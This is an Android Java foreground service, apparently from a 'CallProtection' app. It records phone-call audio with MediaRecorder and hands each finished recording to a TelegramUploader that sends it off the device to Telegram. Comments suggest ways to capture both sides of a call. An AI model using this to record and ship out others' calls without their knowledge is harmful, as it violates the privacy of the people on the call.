package com.daria.callprotection;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * CallService — foreground service that records call audio and uploads to Telegram.
 *
 * Usage:
 *  Intent i = new Intent(context, CallService.class);
 *  i.setAction(CallService.ACTION_START_RECORD);
 *  ContextCompat.startForegroundService(context, i);
 *
 *  Intent stop = new Intent(context, CallService.class);
 *  stop.setAction(CallService.ACTION_STOP_RECORD);
 *  context.startService(stop);
 *
 * Notes:
 *  - Uses MediaRecorder with AUDIO_SOURCE = MIC. On Android 10+ this may not capture remote party reliably.
 *    Consider AudioPlaybackCapture or vendor-specific APIs if you need both sides.
 *  - TelegramUploader.uploadFile(context, file, caption) is expected to be the async wrapper
 *    that sends file and deletes on success. If your TelegramUploader differs, adapt calls accordingly.
 */
public class CallService extends Service {
    public static final String ACTION_START_RECORD = "com.daria.callprotection.ACTION_START_RECORD";
    public static final String ACTION_STOP_RECORD = "com.daria.callprotection.ACTION_STOP_RECORD";

    private static final String TAG = "CallService";
    private static final String CHANNEL_ID = "call_service_channel";
    private static final int NOTIF_ID = 201;

    private MediaRecorder recorder;
    private File audioFile;
    private final ExecutorService ioExecutor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification("Запись звонка готова"));
        FileLogger.log("CallService: created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (intent == null || intent.getAction() == null) {
                FileLogger.log("CallService: null intent or action");
                return START_NOT_STICKY;
            }
            String action = intent.getAction();
            if (ACTION_START_RECORD.equals(action)) {
                FileLogger.log("CallService: ACTION_START_RECORD received");
                startRecordingSafely();
            } else if (ACTION_STOP_RECORD.equals(action)) {
                FileLogger.log("CallService: ACTION_STOP_RECORD received");
                stopRecordingSafely();
            } else {
                FileLogger.log("CallService: unknown action " + action);
            }
        } catch (Exception e) {
            FileLogger.log("CallService: onStartCommand error: " + e.getMessage());
        }
        return START_STICKY;
    }

    private void startRecordingSafely() {
        ioExecutor.submit(() -> {
            try {
                if (recorder != null) {
                    FileLogger.log("CallService: recorder already running");
                    return;
                }

                File dir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "calls");
                if (!dir.exists() && !dir.mkdirs()) {
                    FileLogger.log("CallService: cannot create dir for calls: " + dir.getAbsolutePath());
                }

                audioFile = new File(dir, "call_" + System.currentTimeMillis() + ".m4a");

                recorder = new MediaRecorder();

                // NOTE: AudioSource.MIC — may capture only local voice on some Android versions.
                // For reliable two-side recording on Android 10+, consider AudioPlaybackCapture API.
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setAudioSamplingRate(44100);
                recorder.setAudioEncodingBitRate(128000);
                recorder.setOutputFile(audioFile.getAbsolutePath());

                recorder.prepare();
                recorder.start();

                FileLogger.log("CallService: recording started -> " + audioFile.getAbsolutePath());
            } catch (IOException ioe) {
                FileLogger.log("CallService: startRecording IO error: " + ioe.getMessage());
                cleanupRecorder();
            } catch (SecurityException se) {
                FileLogger.log("CallService: startRecording SecurityException: " + se.getMessage());
                cleanupRecorder();
            } catch (Exception e) {
                FileLogger.log("CallService: startRecording Exception: " + e.getMessage());
                cleanupRecorder();
            }
        });
    }

    private void stopRecordingSafely() {
        ioExecutor.submit(() -> {
            try {
                if (recorder == null) {
                    FileLogger.log("CallService: stopRecording called but recorder == null");
                    return;
                }
                try {
                    recorder.stop();
                } catch (RuntimeException stopEx) {
                    // stop() can throw if recording wasn't started properly; handle gracefully
                    FileLogger.log("CallService: recorder.stop() runtime exception: " + stopEx.getMessage());
                }
                recorder.release();
                recorder = null;
                FileLogger.log("CallService: recording stopped, file: " + (audioFile == null ? "null" : audioFile.getAbsolutePath()));

                // send file asynchronously via TelegramUploader
                if (audioFile != null && audioFile.exists() && audioFile.canRead()) {
                    FileLogger.log("CallService: queue upload for " + audioFile.getName());
                    // Assume uploadFile deletes file on success; if not, adapt.
                    TelegramUploader.uploadFile(getApplicationContext(), audioFile, "Call recording: " + audioFile.getName());
                } else {
                    FileLogger.log("CallService: audio file missing or unreadable after stop");
                }

            } catch (Exception e) {
                FileLogger.log("CallService: stopRecordingSafely error: " + e.getMessage());
            }
        });
    }

    private void cleanupRecorder() {
        try {
            if (recorder != null) {
                try { recorder.reset(); } catch (Exception ignored) {}
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;
            }
        } catch (Exception e) {
            FileLogger.log("CallService: cleanupRecorder error: " + e.getMessage());
        }
    }

    private Notification buildNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("CallProtection")
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_notification) // убедись, что ресурс есть
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public void onDestroy() {
        FileLogger.log("CallService: onDestroy");
        try {
            cleanupRecorder();
            ioExecutor.shutdownNow();
        } catch (Exception e) {
            FileLogger.log("CallService: onDestroy error: " + e.getMessage());
        }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        // not a bound service
        return null;
    }
}
